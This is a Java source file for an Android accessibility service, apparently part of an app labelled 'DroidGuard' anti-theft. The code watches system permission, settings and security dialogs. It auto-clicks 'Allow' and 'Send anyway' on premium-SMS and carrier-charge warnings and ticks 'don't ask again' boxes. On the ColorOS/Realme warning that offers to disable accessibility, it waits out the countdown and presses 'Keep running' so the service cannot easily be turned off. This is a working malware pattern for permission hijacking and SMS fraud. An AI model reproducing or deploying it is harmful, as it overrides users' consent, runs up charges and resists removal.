package com.antitheft.droidguard;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;
import java.util.Locale;

/**
 * DroidGuard Smart Security Auto-Confirm Service
 * 
 * Intelligent Accessibility Service that:
 * 1. Automatically recognizes system SMS and security dialogs.
 * 2. SPECIFICALLY handles the ColorOS/Realme Accessibility Warning Dialog:
 *    - Strictly blocks "إيقاف تشغيل إمكانية الوصول" (Disable Accessibility)!
 *    - Reads the screen, detects the countdown timer, and waits for "استمرار التشغيل" (Keep Running).
 *    - Automatically clicks "استمرار التشغيل" the moment the 4-second countdown finishes!
 * 3. Never clicks dangerous cancel/disable/deny buttons.
 * 4. Checks "Remember my choice" / "عدم السؤال مرة أخرى" for permanent authorization.
 */
public class AutoConfirmService extends AccessibilityService {
    private static final String TAG = "AutoConfirmService";
    public static AutoConfirmService instance = null;

    private static final String PREFS_NAME = "droidguard_security_prefs";
    private static final String KEY_EMERGENCY_ARMED_UNTIL = "emergency_armed_until";
    public static final String ACTION_ARM_EMERGENCY = "com.antitheft.droidguard.ACTION_ARM_EMERGENCY";
    public static final String ACTION_OPEN_POWER_MENU = "com.antitheft.droidguard.ACTION_OPEN_POWER_MENU";

    private static volatile long emergencyArmedUntilMemory = 0L;
    private static long lastActionTimestamp = 0L;
    private static final long ACTION_DEBOUNCE_MS = 350L;

    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private boolean isWatcherRunning = false;

    // Strict Permission & Security Dialog Packages (ColorOS, Realme UI, Xiaomi MIUI/HyperOS, Samsung OneUI, AOSP)
    private static final String[] PERMISSION_DIALOG_PACKAGES = new String[] {
        "com.google.android.permissioncontroller",
        "com.android.permissioncontroller",
        "com.android.packageinstaller",
        "com.samsung.android.permissioncontroller",
        "com.miui.securitycenter",
        "com.oplus.securitypermission",
        "com.coloros.securitypermission",
        "com.oplus.safecenter",
        "com.coloros.safecenter",
        "com.nearme.safecenter",
        "com.oppo.safecenter",
        "com.realme.safecenter",
        "com.transsion.phonemanager",
        "com.huawei.systemmanager",
        "com.android.systemui",
        "com.android.settings",
        "com.coloros.settings",
        "com.oplus.wirelesssettings",
        "android"
    };

    // SMS and Security Confirmation Warning Phrases
    private static final String[] SMS_WARNING_KEYWORDS = new String[] {
        "سيرسل رسالة sms",
        "سيرسل رسالة",
        "رسالة sms",
        "رسالة قصيرة",
        "رسالة",
        "sms",
        "قد تتسبب",
        "فرض رسوم",
        "رسوم إضافية",
        "قد يؤدي هذا إلى فرض رسوم",
        "رسوم مشغل شبكة الجوال",
        "محاولة إرسال رسالة",
        "إرسال رسائل قصيرة",
        "souhaite envoyer un sms",
        "souhaite envoyer un message",
        "peut entraîner des frais",
        "des frais peuvent s'appliquer",
        "frais sur votre facture",
        "sms surtaxé",
        "tente d'envoyer un sms",
        "autoriser l'envoi de sms",
        "would like to send a message",
        "would like to send an sms",
        "cause charges",
        "carrier charges",
        "charges may apply",
        "send premium sms",
        "is attempting to send an sms",
        "أمانك المالي",
        "امانك المالي",
        "خطرا على خصوصيتك",
        "خطرًا على خصوصيتك",
        "إذن إمكانية الوصول",
        "إمكانية الوصول",
        "امكانية الوصول",
        "استمرار التشغيل",
        "financial security",
        "risk to your privacy",
        "accessibility permission"
    };

    // STRICT DANGEROUS/NEGATIVE WORDS: NEVER EVER CLICK A BUTTON CONTAINING THESE!
    private static final String[] DANGEROUS_NEGATIVE_WORDS = new String[] {
        "إيقاف تشغيل إمكانية الوصول",
        "ايقاف تشغيل امكانية الوصول",
        "إيقاف تشغيل",
        "ايقاف تشغيل",
        "إيقاف",
        "ايقاف",
        "تعطيل",
        "إلغاء",
        "الغاء",
        "رفض",
        "عدم السماح",
        "لا تسمح",
        "حظر",
        "disable",
        "turn off",
        "turn-off",
        "shut down",
        "stop",
        "cancel",
        "deny",
        "don't allow",
        "dont allow",
        "block",
        "refuser",
        "annuler",
        "désactiver",
        "desactiver",
        "bloquer"
    };

    // Specific button View IDs used in system SMS confirmation dialogs
    private static final String[] POSITIVE_VIEW_IDS = new String[] {
        "com.android.permissioncontroller:id/permission_allow_button",
        "com.android.permissioncontroller:id/permission_allow_always_button",
        "com.google.android.permissioncontroller:id/permission_allow_button",
        "com.google.android.permissioncontroller:id/permission_allow_always_button",
        "com.android.packageinstaller:id/permission_allow_button",
        "com.samsung.android.permissioncontroller:id/permission_allow_button",
        "com.samsung.android.permissioncontroller:id/permission_allow_always_button",
        "com.miui.securitycenter:id/accept",
        "com.miui.securitycenter:id/btn_allow",
        "com.oplus.safecenter:id/btn_continue",
        "com.coloros.safecenter:id/btn_continue",
        "com.oplus.securitypermission:id/permission_allow_button",
        "com.coloros.securitypermission:id/permission_allow_button",
        "com.oplus.securitypermission:id/btn_allow",
        "com.coloros.securitypermission:id/btn_allow"
    };

    // Explicit Positive Button Phrases (Arabic, French, English)
    private static final String[] POSITIVE_BUTTON_TEXTS = new String[] {
        "إرسال",
        "ارسال",
        "إرسال على أي حال",
        "ارسال على اي حال",
        "السماح",
        "سماح",
        "السماح دائماً",
        "السماح دائما",
        "سماح دائماً",
        "سماح دائما",
        "استمرار التشغيل",
        "استمرار",
        "موافق",
        "نعم",
        "envoyer",
        "envoyer quand même",
        "autoriser",
        "toujours autoriser",
        "continuer",
        "oui",
        "send",
        "send anyway",
        "allow",
        "always allow",
        "allow all the time",
        "continue",
        "keep on",
        "keep using",
        "yes",
        "ok"
    };

    // Checkbox IDs for "Remember my choice"
    private static final String[] CHECKBOX_VIEW_IDS = new String[] {
        "com.android.permissioncontroller:id/do_not_ask_again_checkbox",
        "com.google.android.permissioncontroller:id/do_not_ask_again_checkbox",
        "com.samsung.android.permissioncontroller:id/do_not_ask_again_checkbox",
        "com.samsung.android.messaging:id/remember_choice",
        "com.miui.securitycenter:id/remember",
        "com.oplus.safecenter:id/checkbox",
        "com.coloros.safecenter:id/checkbox"
    };

    public static void armEmergencyAutoConfirm(Context context, long durationMs) {
        long until = System.currentTimeMillis() + durationMs;
        emergencyArmedUntilMemory = until;
        try {
            SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            prefs.edit().putLong(KEY_EMERGENCY_ARMED_UNTIL, until).apply();
        } catch (Exception ignored) {}
    }

    public static boolean isEmergencyWindowActive(Context context) {
        long now = System.currentTimeMillis();
        if (now < emergencyArmedUntilMemory) {
            return true;
        }
        try {
            if (context != null) {
                SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                long storedUntil = prefs.getLong(KEY_EMERGENCY_ARMED_UNTIL, 0L);
                if (now < storedUntil) {
                    emergencyArmedUntilMemory = storedUntil;
                    return true;
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if (ACTION_ARM_EMERGENCY.equals(action)) {
                long duration = intent.getLongExtra("duration", 60_000L);
                long until = System.currentTimeMillis() + duration;
                emergencyArmedUntilMemory = until;
                Log.i(TAG, "🚨 onStartCommand: emergency auto-confirm armed until: " + until);
            } else if (ACTION_OPEN_POWER_MENU.equals(action)) {
                try {
                    performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
                    Log.i(TAG, "⚡ onStartCommand: performed GLOBAL_ACTION_POWER_DIALOG");
                } catch (Throwable t) {
                    Log.w(TAG, "Failed to perform GLOBAL_ACTION_POWER_DIALOG: " + t.getMessage());
                }
            }
        }
        return START_STICKY;
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        Log.i(TAG, "AutoConfirmService initialized in SLEEP mode. Ready for emergency dispatches.");
    }

    @Override
    public void onDestroy() {
        if (instance == this) instance = null;
        isWatcherRunning = false;
        super.onDestroy();
    }

    public static boolean openNativePowerMenu(Context ctx) {
        if (instance != null) {
            try {
                return instance.performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
            } catch (Throwable ignored) {}
        }
        try {
            if (ctx != null) {
                Intent intent = new Intent(ctx, AutoConfirmService.class);
                intent.setAction(ACTION_OPEN_POWER_MENU);
                ctx.startService(intent);
                return true;
            }
        } catch (Throwable ignored) {}
        return false;
    }

    private static void safeRecycle(AccessibilityNodeInfo node) {
        if (node != null) {
            try {
                node.recycle();
            } catch (Throwable ignored) {}
        }
    }

    private static void safeRecycleList(List<AccessibilityNodeInfo> list) {
        if (list != null) {
            for (AccessibilityNodeInfo node : list) {
                safeRecycle(node);
            }
            list.clear();
        }
    }

    /**
     * Checks whether a node or its text represents a dangerous negative action (e.g. Disable / Turn off / Cancel).
     */
    private boolean isDangerousNode(AccessibilityNodeInfo node) {
        if (node == null) return false;
        try {
            CharSequence text = node.getText();
            if (text != null && containsDangerousWord(text.toString())) {
                return true;
            }
            CharSequence desc = node.getContentDescription();
            if (desc != null && containsDangerousWord(desc.toString())) {
                return true;
            }
            // Check immediate child nodes
            int count = node.getChildCount();
            for (int i = 0; i < count; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    try {
                        CharSequence cText = child.getText();
                        if (cText != null && containsDangerousWord(cText.toString())) {
                            return true;
                        }
                    } finally {
                        safeRecycle(child);
                    }
                }
            }
        } catch (Throwable ignored) {}
        return false;
    }

    private boolean containsDangerousWord(String raw) {
        if (raw == null || raw.trim().isEmpty()) return false;
        String lower = raw.toLowerCase(Locale.ROOT).trim();
        for (String danger : DANGEROUS_NEGATIVE_WORDS) {
            if (lower.contains(danger)) {
                return true;
            }
        }
        return false;
    }

    /**
     * Extract all visible text from the window hierarchy to understand what is displayed.
     */
    private String extractAllText(AccessibilityNodeInfo node) {
        if (node == null) return "";
        StringBuilder sb = new StringBuilder();
        collectTextRecursive(node, sb, 0);
        return sb.toString();
    }

    private void collectTextRecursive(AccessibilityNodeInfo node, StringBuilder sb, int depth) {
        if (node == null || depth > 25) return;
        try {
            CharSequence text = node.getText();
            if (text != null && text.length() > 0) {
                sb.append(" ").append(text);
            }
            CharSequence desc = node.getContentDescription();
            if (desc != null && desc.length() > 0) {
                sb.append(" ").append(desc);
            }
            int count = node.getChildCount();
            for (int i = 0; i < count; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    try {
                        collectTextRecursive(child, sb, depth + 1);
                    } finally {
                        safeRecycle(child);
                    }
                }
            }
        } catch (Throwable ignored) {}
    }

    /**
     * Detects if the current screen is the ColorOS / Realme / Android Accessibility Security Warning dialog.
     */
    private boolean isAccessibilitySecurityDialog(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) return false;
        String full = extractAllText(rootNode).toLowerCase(Locale.ROOT);
        boolean mentionsAccessibility = full.contains("إمكانية الوصول") 
            || full.contains("امكانية الوصول")
            || full.contains("accessibility");
            
        boolean mentionsWarningOrContinue = full.contains("استمرار التشغيل")
            || full.contains("استمرار")
            || full.contains("أمانك المالي")
            || full.contains("امانك المالي")
            || full.contains("خصوصيتك")
            || full.contains("خطر")
            || full.contains("تم منح")
            || full.contains("financial security")
            || full.contains("privacy");

        return mentionsAccessibility && mentionsWarningOrContinue;
    }

    /**
     * Finds the "استمرار التشغيل" / "Continue" button in the hierarchy.
     */
    private AccessibilityNodeInfo findContinueButtonRecursive(AccessibilityNodeInfo node) {
        if (node == null) return null;
        try {
            if (!isDangerousNode(node)) {
                CharSequence text = node.getText();
                if (text != null) {
                    String s = text.toString().toLowerCase(Locale.ROOT).trim();
                    if (s.contains("استمرار") || s.contains("continuer") || s.contains("continue") || s.contains("keep")) {
                        return AccessibilityNodeInfo.obtain(node);
                    }
                }
                CharSequence desc = node.getContentDescription();
                if (desc != null) {
                    String s = desc.toString().toLowerCase(Locale.ROOT).trim();
                    if (s.contains("استمرار") || s.contains("continuer") || s.contains("continue") || s.contains("keep")) {
                        return AccessibilityNodeInfo.obtain(node);
                    }
                }
            }

            int count = node.getChildCount();
            for (int i = 0; i < count; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    try {
                        AccessibilityNodeInfo found = findContinueButtonRecursive(child);
                        if (found != null) {
                            return found;
                        }
                    } finally {
                        safeRecycle(child);
                    }
                }
            }
        } catch (Throwable ignored) {}
        return null;
    }

    /**
     * Start background watcher loop to monitor countdown and click "استمرار التشغيل" as soon as it becomes enabled.
     */
    private void startContinueWatcher() {
        if (isWatcherRunning) return;
        isWatcherRunning = true;

        final long startTime = SystemClock.uptimeMillis();
        final long MAX_WATCH_TIME_MS = 8000L; // Poll for up to 8 seconds

        mainHandler.post(new Runnable() {
            @Override
            public void run() {
                if (!isWatcherRunning) return;

                if (SystemClock.uptimeMillis() - startTime > MAX_WATCH_TIME_MS) {
                    Log.i(TAG, "Continue watcher finished timeout.");
                    isWatcherRunning = false;
                    return;
                }

                AccessibilityNodeInfo root = null;
                try {
                    root = getRootInActiveWindow();
                    if (root != null) {
                        AccessibilityNodeInfo target = findContinueButtonRecursive(root);
                        if (target != null) {
                            try {
                                CharSequence t = target.getText();
                                boolean enabled = target.isEnabled();
                                Log.d(TAG, "Watcher checking continue button: [" + t + "], isEnabled=" + enabled);

                                if (enabled) {
                                    boolean clicked = clickNodeOrParent(target);
                                    if (clicked) {
                                        Log.i(TAG, "🎉 Watcher: Successfully clicked 'استمرار التشغيل' (Keep Running)!");
                                        isWatcherRunning = false;
                                        return;
                                    }
                                }
                            } finally {
                                safeRecycle(target);
                            }
                        }
                    }
                } catch (Throwable e) {
                    Log.w(TAG, "Watcher cycle error: " + e.getMessage());
                } finally {
                    safeRecycle(root);
                }

                if (isWatcherRunning) {
                    mainHandler.postDelayed(this, 300);
                }
            }
        });
    }

    /**
     * Specialized handler for the ColorOS Accessibility Security Warning dialog.
     * STRICTLY PREVENTS clicking "إيقاف تشغيل إمكانية الوصول"!
     */
    private boolean handleAccessibilitySecurityDialog(AccessibilityNodeInfo rootNode) {
        Log.i(TAG, "🛡️ Handling Accessibility Security Dialog. Protecting service from shutdown!");

        AccessibilityNodeInfo continueBtn = findContinueButtonRecursive(rootNode);
        if (continueBtn != null) {
            try {
                CharSequence text = continueBtn.getText();
                String textStr = text != null ? text.toString() : "";
                Log.i(TAG, "Target continue button text: [" + textStr + "], isEnabled: " + continueBtn.isEnabled());

                if (continueBtn.isEnabled()) {
                    boolean clicked = clickNodeOrParent(continueBtn);
                    if (clicked) {
                        Log.i(TAG, "🎉 Successfully clicked 'استمرار التشغيل'!");
                        isWatcherRunning = false;
                        return true;
                    }
                } else {
                    Log.i(TAG, "⏳ Countdown timer in progress (" + textStr + "). Starting smart watcher...");
                }
            } finally {
                safeRecycle(continueBtn);
            }
        }

        // Start active polling until the countdown finishes and button becomes enabled
        startContinueWatcher();
        return true;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        AccessibilityNodeInfo rootNode = null;
        try {
            CharSequence pkgName = event.getPackageName();
            if (pkgName == null) return;
            String pkgStr = pkgName.toString().toLowerCase(Locale.ROOT);

            // Skip all keyboard, IME, and search engines immediately
            if (pkgStr.contains("inputmethod") || pkgStr.contains("keyboard") || 
                pkgStr.contains("ime") || pkgStr.contains("baidu") || pkgStr.contains("touchtype")) {
                return;
            }

            // Check if package belongs to known system permission controllers, package installers, or security centers
            boolean isSecurityPackage = false;
            for (String p : PERMISSION_DIALOG_PACKAGES) {
                if (pkgStr.equals(p) || pkgStr.startsWith(p)) {
                    isSecurityPackage = true;
                    break;
                }
            }

            // If not a system security/permission package, require active emergency window
            if (!isSecurityPackage && !isEmergencyWindowActive(this)) {
                return;
            }

            long now = SystemClock.uptimeMillis();
            if (now - lastActionTimestamp < ACTION_DEBOUNCE_MS) {
                return;
            }

            rootNode = getRootInActiveWindow();
            if (rootNode == null) {
                rootNode = event.getSource();
            }
            if (rootNode == null) return;

            // INTELLIGENT ROUTE 1: ColorOS / Realme Accessibility Security Warning Dialog
            if (isAccessibilitySecurityDialog(rootNode)) {
                lastActionTimestamp = now;
                handleAccessibilitySecurityDialog(rootNode);
                return;
            }

            // Check if dialog contains SMS or permission warning keywords
            boolean isSmsWarningDialog = false;
            for (String kw : SMS_WARNING_KEYWORDS) {
                List<AccessibilityNodeInfo> nodes = null;
                try {
                    nodes = rootNode.findAccessibilityNodeInfosByText(kw);
                    if (nodes != null && !nodes.isEmpty()) {
                        isSmsWarningDialog = true;
                        Log.i(TAG, "🚨 Confirmed SMS dialog via keyword [" + kw + "] on package [" + pkgStr + "]");
                        break;
                    }
                } catch (Throwable ignored) {
                } finally {
                    safeRecycleList(nodes);
                }
            }

            // If not an SMS dialog and not a security package, ignore
            if (!isSmsWarningDialog && !isSecurityPackage) {
                return;
            }

            lastActionTimestamp = now;

            // Step 1: Auto-check "Remember my choice" / "عدم السؤال مرة أخرى"
            autoCheckRememberChoice(rootNode);

            // Step 2: Attempt clicking exact positive button phrases (SMS Send / Allow)
            for (String positiveText : POSITIVE_BUTTON_TEXTS) {
                List<AccessibilityNodeInfo> matchingButtons = null;
                try {
                    matchingButtons = rootNode.findAccessibilityNodeInfosByText(positiveText);
                    if (matchingButtons != null && !matchingButtons.isEmpty()) {
                        for (AccessibilityNodeInfo btn : matchingButtons) {
                            // CRITICAL: NEVER click if node is dangerous!
                            if (!isDangerousNode(btn) && btn.isEnabled() && clickNodeOrParent(btn)) {
                                Log.i(TAG, "✅ Auto-confirmed SMS send via text [" + positiveText + "] successfully!");
                                safeRecycleList(matchingButtons);
                                return;
                            }
                        }
                    }
                } catch (Throwable ignored) {
                } finally {
                    safeRecycleList(matchingButtons);
                }
            }

            // Step 3: Attempt clicking positive button by known OEM View IDs
            for (String viewId : POSITIVE_VIEW_IDS) {
                List<AccessibilityNodeInfo> positiveButtons = null;
                try {
                    positiveButtons = rootNode.findAccessibilityNodeInfosByViewId(viewId);
                    if (positiveButtons != null && !positiveButtons.isEmpty()) {
                        for (AccessibilityNodeInfo btn : positiveButtons) {
                            // CRITICAL: NEVER click if node is dangerous!
                            if (!isDangerousNode(btn) && btn.isEnabled() && clickNodeOrParent(btn)) {
                                Log.i(TAG, "✅ Auto-confirmed SMS send via OEM View ID [" + viewId + "] successfully!");
                                safeRecycleList(positiveButtons);
                                return;
                            }
                        }
                    }
                } catch (Throwable ignored) {
                } finally {
                    safeRecycleList(positiveButtons);
                }
            }

        } catch (Throwable e) {
            Log.w(TAG, "Safe catch in onAccessibilityEvent: " + e.getMessage());
        } finally {
            safeRecycle(rootNode);
        }
    }

    /**
     * Check any unchecked checkbox in the dialog (e.g. "Do not ask again" / "تذكر خياري" / "Ne plus me demander")
     */
    private void autoCheckRememberChoice(AccessibilityNodeInfo root) {
        if (root == null) return;

        // Try known View IDs first
        for (String cid : CHECKBOX_VIEW_IDS) {
            List<AccessibilityNodeInfo> checkboxes = null;
            try {
                checkboxes = root.findAccessibilityNodeInfosByViewId(cid);
                if (checkboxes != null) {
                    for (AccessibilityNodeInfo cb : checkboxes) {
                        if (cb.isCheckable() && !cb.isChecked()) {
                            cb.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.i(TAG, "Checked 'Remember my choice' option via View ID: " + cid);
                        }
                    }
                }
            } catch (Throwable ignored) {
            } finally {
                safeRecycleList(checkboxes);
            }
        }

        // Try matching common checkbox text in Arabic, French, English
        String[] rememberTexts = new String[] {
            "تذكر خياري",
            "عدم السؤال مرة أخرى",
            "تذكر اختياري",
            "لا تسأل مرة أخرى",
            "ne plus me demander",
            "se souvenir de mon choix",
            "mémoriser mon choix",
            "remember my choice",
            "don't ask again",
            "do not ask again"
        };
        for (String rText : rememberTexts) {
            List<AccessibilityNodeInfo> nodes = null;
            try {
                nodes = root.findAccessibilityNodeInfosByText(rText);
                if (nodes != null) {
                    for (AccessibilityNodeInfo node : nodes) {
                        if (node.isCheckable() && !node.isChecked()) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.i(TAG, "Checked 'Remember my choice' option via text: " + rText);
                        } else {
                            AccessibilityNodeInfo parent = node.getParent();
                            if (parent != null) {
                                for (int i = 0; i < parent.getChildCount(); i++) {
                                    AccessibilityNodeInfo child = parent.getChild(i);
                                    if (child != null) {
                                        if (child.isCheckable() && !child.isChecked()) {
                                            child.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                            Log.i(TAG, "Checked 'Remember my choice' sibling checkbox for: " + rText);
                                        }
                                        safeRecycle(child);
                                    }
                                }
                                safeRecycle(parent);
                            }
                        }
                    }
                }
            } catch (Throwable ignored) {
            } finally {
                safeRecycleList(nodes);
            }
        }
    }

    private boolean clickNodeOrParent(AccessibilityNodeInfo node) {
        if (node == null) return false;
        try {
            if (node.isClickable()) {
                return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
            AccessibilityNodeInfo parent = node.getParent();
            if (parent != null) {
                try {
                    if (parent.isClickable()) {
                        return parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                    AccessibilityNodeInfo grandParent = parent.getParent();
                    if (grandParent != null) {
                        try {
                            if (grandParent.isClickable()) {
                                return grandParent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            }
                        } finally {
                            safeRecycle(grandParent);
                        }
                    }
                } finally {
                    safeRecycle(parent);
                }
            }
        } catch (Throwable ignored) {}
        return false;
    }

    @Override
    public void onInterrupt() {
        Log.i(TAG, "AutoConfirmService interrupted.");
    }
}
